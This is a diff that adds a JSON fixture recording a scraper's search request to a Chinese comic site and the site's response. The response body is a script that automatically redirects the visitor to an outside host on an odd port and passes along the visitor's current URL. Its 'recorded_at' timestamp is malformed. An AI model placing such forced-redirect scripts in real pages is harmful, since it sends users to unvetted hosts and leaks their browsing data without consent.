@@ -1,0 +1,26 @@
+{
+  "source_id": "corpus-4fb1e8048517",
+  "source_name": "野蛮漫画（优）",
+  "recorded_at": "1970-01-01T00:00:1782641054Z",
+  "keyword": "斗破苍穹",
+  "steps": [
+    {
+      "level": "L2-search",
+      "url": "https://yemancomic.com/search?searchkey=%E6%96%97%E7%A0%B4%E8%8B%8D%E7%A9%B9",
+      "method": "GET",
+      "request_headers": {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
+      },
+      "request_body": null,
+      "response_status": 200,
+      "response_headers": {
+        "alt-svc": "h3=\":443\"; ma=2592000,h3-29=\":443\"; ma=2592000",
+        "content-length": "416",
+        "content-type": "text/html; charset=utf-8",
+        "date": "Sun, 28 Jun 2026 10:04:14 GMT"
+      },
+      "response_body": "<html><body><a href=\"\" id=\"hostcli\"></a><script type=\"text/javascript\">var strU=\"https://v1.to301.xyz:9952/?u=\"+window.location+\"&p=\"+window.location.pathname+window.location.search;hostcli.href=strU;if(document.all){document.getElementById(\"hostcli\").click();}else {var e=document.createEvent(\"MouseEvents\");e.initEvent(\"click\",true,true);document.getElementById(\"hostcli\").dispatchEvent(e);}</script></body></html>",
+      "final_url": "https://yemancomic.com/search?searchkey=%E6%96%97%E7%A0%B4%E8%8B%8D%E7%A9%B9"
+    }
+  ]
+}
